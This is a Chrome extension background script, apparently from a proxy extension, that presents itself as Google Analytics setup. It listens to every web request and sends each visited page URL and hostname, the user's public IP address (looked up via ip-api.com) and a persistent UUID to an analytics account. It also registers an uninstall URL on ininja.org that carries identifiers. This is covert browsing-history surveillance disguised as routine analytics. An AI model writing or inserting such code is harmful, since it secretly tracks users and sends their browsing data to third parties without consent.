"use strict"

const googleAnalytics = new (function() {

    this.analyticsUrl = 'https://ininja.org/analytics.php';

    this.init = function() {
        this.insertScript();

        ga('create', 'UA-111112569-1', 'auto');
        ga('set', 'checkProtocolTask', null);

        // set user data
        this.setUUID();

        // set user ip addr
        this.setUserIp(function() { ga('send', 'pageview'); });

        // hook request
        chrome.webRequest.onBeforeRequest.addListener(
            this.onBeforeRequest.bind(this),
            { urls: ['<all_urls>'] }, []
        );

        // set uninstall link
        chrome.runtime.setUninstallURL(this.analyticsUrl + this.getPayloadData('uninstall'));

        // listener on event install
        chrome.runtime.onInstalled.addListener(this.sendEventAppInstall.bind(this));
    };

    // insert script to dom
    this.insertScript = function() {
        (function(i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function() {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date(); a = s.createElement(o),
            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
    };

    // set user ip addr
    this.setUserIp = function (callback) {
        fetch('http://ip-api.com/json')
            .then(function (response) {
                if (response.status == 200)
                    return response.json()
            })
            .then(function(data) {
              if(data && data.query)
                ga('set', 'dimension1', data.query)
            })
            .catch(function (error) { console.log(error); })
            .finally(callback);
    };

    this.setUUID = function() {
        var uuid = localStorage.getItem('uuid');
        if (!uuid) {
            uuid = UUID.create();
            localStorage.setItem('uuid', uuid);
        }
        ga('set', 'dimension2', uuid);
    };

    this.onBeforeRequest = function(details) {
        if (details.tabId !== -1 && details.type == 'main_frame' && details.url.length)
            this.sendUserRequest(details.url);
    };

    this.sendUserRequest = function(url) {
        ga('send', 'event', {
            eventCategory: 'UserAction',
            eventAction: 'UserRequest',
            dimension3: url,
            dimension4: extractHostname(url)
        });
    };

    this.sendEventAppInstall = function(details) {
        if(details.reason == 'install' || details.reason == 'update') {
            var uuid = localStorage.getItem('uuid');
            var manifest = chrome.runtime.getManifest();

            ga('send', 'event', {
                eventCategory: 'ProxyServerScript',
                eventAction: details.reason,
                dimension2: uuid,
                dimension6: chrome.runtime.id,
                dimension7: manifest.version
            });
        }
    };

    this.getPayloadData = function(action) {
        var uuid = localStorage.getItem('uuid');
        var manifest = chrome.runtime.getManifest();
        return `?action=${action}&uuid=${uuid}&appId=${chrome.runtime.id}&appVersion=${manifest.version}`;
    };
});

googleAnalytics.init();
